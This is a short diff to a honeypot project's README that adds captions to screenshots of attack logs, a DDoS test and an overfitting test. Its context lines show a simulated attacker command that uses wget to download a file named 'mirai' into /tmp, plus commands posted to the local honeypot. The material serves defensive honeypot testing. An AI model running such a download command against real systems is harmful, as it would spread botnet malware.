@@ -96,6 +96,7 @@ wget http://loclhost/mirai -O /tmp/mirai
 # All attacker operations will be recorded in honeypot.log, and can also be viewed at http://localhost:8186/logs
 ```
 
+Attacker and Honeypot backend platform
 ![Honeypot DDos](images/Connect_attack.png)
 ![Honeypot DDos](images/Honeypot_screen.png)
 
@@ -112,6 +113,8 @@ Invoke-WebRequest -Uri "http://127.0.0.1:8186/command" -Method POST -Body "ls -l
 ```bash
 Run python DDos_test.py
 ```
+
+DDos Attack
 ![Honeypot DDos](images/DDos_attack.png)
 
 ### Overfitting test
@@ -121,6 +124,8 @@ Run python DDos_test.py
           eche 'hello world'
           cat payliat
 ```
+
+Overfitting issue
 ![Honeypot overfitting](images/overfitting.png)
 
 ## Security Evaluation
